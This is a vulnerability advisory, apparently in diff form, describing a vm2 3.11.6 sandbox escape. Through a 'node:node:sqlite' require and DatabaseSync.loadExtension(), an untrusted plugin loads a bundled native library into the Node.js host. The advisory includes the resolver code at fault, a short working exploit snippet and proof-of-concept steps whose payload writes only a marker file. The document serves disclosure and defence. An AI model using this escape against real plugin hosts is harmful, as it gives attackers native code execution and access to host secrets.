@@ -1,0 +1,95 @@
+Summary
+vm2 3.11.6 exposes Node.js's host node:sqlite module to NodeVM code when that builtin is allowed explicitly or through builtin: ['*']. The module is wrapped as read-only, but callable methods retain host-process authority. A sandboxed plugin can construct an in-memory database with extension loading enabled and call DatabaseSync.loadExtension() on a native library bundled in the plugin directory.
+
+SQLite loads the library into the Node.js host process and invokes its native extension entry point. This gives the untrusted plugin arbitrary native code execution outside the sandbox.
+
+The exploit needs only the node:sqlite builtin and a compatible native library already present in the untrusted plugin package. It does not require fs, process, module, child_process, worker_threads, vm, inspector, vm2 nesting, or an existing database file.
+
+Details
+The vulnerable boundary spans the builtin inventory, resolver, runtime loader, and generic read-only wrapper.
+
+On current Node.js versions, the builtin inventory contains the literal name node:sqlite. vm2 admits that name when it is explicitly configured or when the wildcard allowlist is expanded:
+
+const BUILTIN_MODULES = module.builtinModules.filter(/* denylist checks */);
+The resolver then treats every request beginning with node: as a core-module request, even if the complete request string is not an allowlist key:
+
+if (x.startsWith('node:') || this.builtins.has(x)) {
+  return x;
+}
+The sandbox runtime removes exactly one node: prefix and looks up the remainder in the configured builtin map:
+
+if (filename.startsWith('node:')) {
+  id = filename.slice(5);
+  return loadBuiltinModule(id);
+}
+Consequently, the sandbox spelling below resolves to the configured map entry node:sqlite:
+
+require('node:node:sqlite')
+The default builtin loader imports the real module in the host realm and exposes it through vm.readonly():
+
+builtins.set(key, vm => vm.readonly(hostRequire(key)));
+Read-only wrapping prevents property assignment. It does not remove dangerous callable capabilities. Calls to DatabaseSync and loadExtension() are forwarded to the host implementation.
+
+The complete exploit flow is:
+
+attacker supplies an untrusted plugin package containing JavaScript and a native library
+  -> host runs the JavaScript in NodeVM with node:sqlite allowed
+  -> plugin resolves the host module as node:node:sqlite
+  -> plugin creates an in-memory DatabaseSync with allowExtension enabled
+  -> plugin derives the bundled library path from its own __dirname
+  -> plugin calls database.loadExtension(libraryPath)
+  -> vm2 forwards the call to host SQLite
+  -> SQLite loads the library into the Node.js host process
+  -> SQLite invokes the library's native extension entry point
+  -> attacker native code executes with the host process's privileges
+The path does not need to be read through a sandboxed filesystem API. CommonJS already supplies the plugin's own directory, so an attacker can concatenate __dirname with the known name of a bundled library. The host necessarily places the untrusted plugin package on disk before evaluating its JavaScript.
+
+PoC
+The attached PoC is local and harmless. Its native extension entry point writes one marker file and returns success. It does not launch a process, connect to a network service, or modify any other file.
+
+Prerequisites: macOS, Node.js with node:sqlite, npm, and a C compiler.
+
+Open the attached poc directory.
+
+Install the exact affected package:
+
+npm install --ignore-scripts
+Compile and run the proof:
+
+npm run poc
+The script compiles extension_probe.c as libvm2_sqlite_probe.dylib, then runs untrusted-plugin.js in this restrictive configuration:
+
+new NodeVM({
+  console: 'off',
+  require: { builtin: ['node:sqlite'] },
+});
+The sandboxed plugin performs only:
+
+const { DatabaseSync } = require('node:node:sqlite');
+const database = new DatabaseSync(':memory:', { allowExtension: true });
+database.loadExtension(__dirname + '/libvm2_sqlite_probe.dylib');
+database.close();
+A vulnerable result is:
+
+{
+  "sandboxResult": {
+    "nativeExtensionLoaded": true,
+    "usedOnlySQLiteBuiltin": true
+  },
+  "markerExists": true,
+  "markerText": "VM2_SQLITE_EXTENSION_ENTRYPOINT_EXECUTED"
+}
+The marker is written from the compiled native extension entry point, not from JavaScript. loadExtension() also returns successfully, proving that SQLite both loaded the library and invoked its entry point.
+
+Impact
+This is a sandbox escape to arbitrary native code execution. The native code runs inside the Node.js host process with the operating-system identity and privileges of that process, beyond all vm2 JavaScript, module, and proxy restrictions.
+
+An attacker can replace the marker-only extension with native code that:
+
+reads application secrets, credentials, environment variables, and files available to the host account;
+modifies application data or executable files and establishes persistence;
+accesses internal services using the host's network identity;
+steals other tenants' data from the same process;
+terminates or corrupts the host process; and
+performs any other operating-system action permitted to the host account.
+The realistic affected workflow is a plugin platform, automation service, notebook, build service, or multi-tenant code runner that stores attacker-supplied package contents and evaluates the package's JavaScript in NodeVM while allowing node:sqlite or all builtins. The attacker does not need pre-existing host execution, a writable database, or a command-execution builtin.
